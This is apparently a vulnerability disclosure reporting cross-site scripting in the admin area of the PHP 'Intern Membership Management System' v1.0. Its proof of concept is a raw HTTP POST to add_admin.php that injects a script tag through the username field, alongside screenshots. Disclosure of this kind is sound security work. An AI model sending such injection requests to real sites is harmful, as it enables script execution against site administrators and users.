#  Intern Membership Management System admin.php cross site scripting

## NAME OF AFFECTED PRODUCT(S)

Intern Membership Management System

## Vendor Homepage

https://code-projects.org/intern-membership-management-system-in-php-with-source-code/

## Vulnerable File

admin.php

## VERSION(S)

v1.0

## Vulnerability Type

cross site scripting

## DESCRIPTION

There is a cross site scripting vulnerability in the admin.php file of the Intern Membership Management System project, It is possible to initiate the attack remotely

## Vulnerability details and POC

![image-20260107194519910](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107194519910.8adqs6qyj9.webp)

![image-20260107194554271](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107194554271.7w7b1bino4.webp)

Data packet：

```
POST /intern/admin/add_admin.php HTTP/1.1
Host: localhost
Content-Length: 91
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="99", "Chromium";v="142"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/intern/admin/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=3l4ll80jd6nc6hk93m2d0ro425
Connection: keep-alive

username=test%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&password=test&name=test&save_admin=
```

![image-20260107194645545](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107194611937.1ovx15mwk3.webp)
